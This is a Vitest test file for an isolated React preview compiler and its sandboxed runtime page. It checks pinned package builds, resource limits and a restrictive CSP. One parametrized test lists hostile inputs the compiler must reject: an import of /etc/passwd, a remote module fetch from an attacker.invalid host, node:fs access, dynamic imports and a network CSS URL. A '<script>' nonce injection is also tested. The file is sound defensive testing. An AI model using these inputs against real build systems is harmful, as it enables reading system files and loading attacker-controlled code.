import { describe, expect, it } from 'vitest';
import { createHash } from 'node:crypto';
import { compileReactPreview, getReactPackageSet } from './react-compiler.mjs';
import { createReactRuntimeDocument, reactRuntimeCsp } from './react-compiler-runtime.mjs';

const compile = (code, options) => compileReactPreview({ title: 'React 검증', code }, options);
const source = "import React, {useState} from 'react'; export default function App(){const [count,setCount]=useState(0);return <button className='p-4 bg-blue-500 text-white' onClick={()=>setCount(count+1)}>{count}</button>}";
const hash = (value) => createHash('sha256').update(value).digest('hex');

describe('isolated React compiler and pinned runtime', () => {
  it('builds actual React source and Tailwind CSS against the pinned package set', async () => {
    const artifact = await compile(source);
    const packages = await getReactPackageSet();
    expect(artifact.bundle).toContain('AXRCompiledApp'); expect(artifact.bundle).toContain('useState');
    expect(artifact.css).toContain('.p-4'); expect(artifact.css).toContain('.bg-blue-500');
    expect(artifact.sourceHash).toBe(hash(source)); expect(artifact.bundleHash).toBe(hash(artifact.bundle)); expect(artifact.cssHash).toBe(hash(artifact.css));
    expect(artifact.packageSetHash).toBe(packages.packageSetHash);
    expect(packages.bundleHash).toBe(hash(packages.bundle)); expect(packages.bundle).toContain('AXRReactPackages');
    expect(artifact.dependencies).toEqual(expect.arrayContaining([{ name: 'react', version: '18.3.1' }, { name: 'esbuild', version: '0.25.12' }]));
    expect(await getReactPackageSet()).toBe(packages);
  });
  it.each([
    "import secret from '/etc/passwd'; export default ()=> <div>{secret}</div>",
    "import x from './private.js'; export default ()=> <div>{x}</div>",
    "import x from 'https://attacker.invalid/module.js'; export default ()=> <div>{x}</div>",
    "import fs from 'node:fs'; export default ()=> <div>{fs}</div>",
    "import fs from 'node:fs'; export default ()=> <div/>",
    "import type {Stats} from 'node:fs'; export default ()=> <div/>",
    "import x from 'axios'; export default ()=> <div>{x}</div>",
    "export default ()=>{ import('react'); return <div/>; }",
    "export default ()=>{ const moduleName='react'; import(moduleName); return <div/>; }",
    "const x=require('react'); export default ()=> <div/>",
    "export default ()=> <div className='bg-[url(https://attacker.invalid/image)]'/>",
  ])('rejects unregistered imports, dynamic modules and network CSS: %s', async (code) => {
    await expect(compile(code)).rejects.toMatchObject({ code: 'react_compile_failed' });
  });
  it('never executes app top-level code inside the compiler process', async () => {
    const result = await compile(`throw new Error('must run only in browser'); while(true){} export default function App(){return <div>실행 전</div>}`);
    expect(result.bundle).toContain('must run only in browser');
  });
  it('enforces source size, deadline, cancellation and the no-queue concurrency limit', async () => {
    await expect(compile('x'.repeat(160001))).rejects.toMatchObject({ code: 'react_source_invalid' });
    const controller = new AbortController(); controller.abort();
    await expect(compile(source, { signal: controller.signal })).rejects.toMatchObject({ code: 'react_compile_cancelled' });
    const pending = compile(source, { timeoutMs: 1 }); const rejected = compile(source);
    await expect(rejected).rejects.toMatchObject({ code: 'react_compile_busy' });
    await expect(pending).rejects.toMatchObject({ code: 'react_compile_timeout' });
    expect((await compile(source)).bundle).toContain('AXRCompiledApp');
  });
  it('builds a fixed runtime page with opaque bridge identity and a restrictive header contract', async () => {
    const packageSet = await getReactPackageSet(); const options = { nonce: 'runtime-test-nonce-123456', parentOrigin: 'http://127.0.0.1:4178', packageSetHash: packageSet.packageSetHash };
    const html = createReactRuntimeDocument(options); const csp = reactRuntimeCsp(options);
    expect(html).toContain(`/packages/${packageSet.packageSetHash}.js`); expect(html).toContain('axr-react-connect'); expect(html).toContain('event.source !== parent');
    expect(csp).toContain("connect-src 'none'"); expect(csp).toContain("worker-src 'none'"); expect(csp).toContain(`frame-ancestors ${options.parentOrigin}`);
    expect(csp).not.toContain('unsafe-eval'); expect(csp).not.toContain('allow-same-origin');
    expect(csp).toContain(", script-src 'self' 'unsafe-inline'");
    expect(() => createReactRuntimeDocument({ ...options, nonce: '<script>' })).toThrow();
    expect(() => createReactRuntimeDocument({ ...options, parentOrigin: 'https://host.invalid/anything' })).toThrow();
  });
});
